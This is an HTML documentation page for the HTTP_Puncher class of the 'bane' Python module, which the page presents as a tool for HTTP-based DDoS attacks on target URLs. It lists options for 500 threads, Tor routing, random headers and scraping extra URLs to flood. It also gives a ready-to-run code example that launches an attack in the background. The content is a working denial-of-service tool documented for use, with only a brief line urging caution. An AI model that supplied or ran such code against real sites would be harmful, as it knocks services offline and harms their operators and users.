<h1>HTTP_Puncher Class</h1>

<h2>Class Overview</h2>
<p>The <code>HTTP_Puncher</code> class is part of the "bane" module and is used for launching HTTP-based DDoS attacks on a target URL.</p>

<h2>Class Constructor</h2>
<pre><code>class HTTP_Puncher(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>HTTP_Puncher</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL for the DDoS attack.</li>
    <li><code>send_files</code> (bool): Enable or disable sending files in the attack (default is True).</li>
    <li><code>cookie</code> (str): Custom cookies to include in requests.</li>
    <li><code>user_agents</code> (list): List of custom User-Agent headers for requests.</li>
    <li><code>method</code> (int): HTTP request method (1 for GET, 2 for POST, 3 for random; default is 3).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>urls</code> (list): List of target URLs for the attack (default is an empty list).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 500).</li>
    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
    <li><code>tor</code> (bool): Use Tor for requests (default is False).</li>
    <li><code>scrape_target</code> (bool): Scrape additional URLs for the attack (default is True).</li>
    <li><code>scraped_urls</code> (int): Number of scraped URLs (default is 32).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the DDoS attack by sending HTTP requests to the target URL with random headers and data. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>HTTP_Puncher</code> class, create an instance of it by providing the required parameters, and it will start launching DDoS attacks in the background. Here's an example:</p>

<pre><code>
from bane.ddos import HTTP_Puncher

# Create an instance of HTTP_Puncher
ddos_attack = HTTP_Puncher(
    u="https://example.com",
    send_files=True,
    cookie="CustomCookie",
    user_agents=["UserAgent1", "UserAgent2"],
    method=3,
    threads_daemon=True,
    urls=["https://example.com/page1", "https://example.com/page2"],
    threads=500,
    timeout=5,
    duration=60,
    logs=True,
    tor=False,
    scrape_target=False,
    scraped_urls=5
)

# DDoS attack is launched in the background
# Monitor the attack's progress as needed

# To stop the attack, you can set ddos_attack.stop = True

# Be cautious and responsible when using DDoS attacks in a real environment.
</code></pre>
